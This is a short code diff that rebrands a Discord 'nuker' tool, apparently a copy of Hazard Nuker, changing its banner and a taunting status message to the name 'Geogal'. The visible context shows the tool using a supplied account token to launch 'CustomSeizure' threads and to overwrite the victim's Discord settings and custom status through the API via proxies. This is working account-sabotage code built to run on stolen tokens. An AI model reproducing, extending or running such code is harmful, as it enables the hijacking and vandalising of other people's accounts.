@@ -14,7 +14,7 @@ from util.plugins.common import SlowPrint, setTitle, getheaders, proxy
 
 def Hazard_Nuke(token, Server_Name, message_Content):
     setTitle("Deploying Hazardous Nuke")
-    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Hazard Nuke Deployed. . .")
+    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Geogal Nuke Deployed. . .")
     if threading.active_count() <= 100:
         t = threading.Thread(target=CustomSeizure, args=(token, ))
         t.start()
@@ -85,7 +85,7 @@ def Hazard_Nuke(token, Server_Name, message_Content):
           'convert_emoticons': False,
           'enable_tts_command': False,
           'explicit_content_filter': '0',
-          "custom_status": {"text": "I got shit on by https://github.com/Rdimo/Hazard-Nuker"},
+          "custom_status": {"text": "I got shit on by Geogal"},
           'status': "idle"
     }
     requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
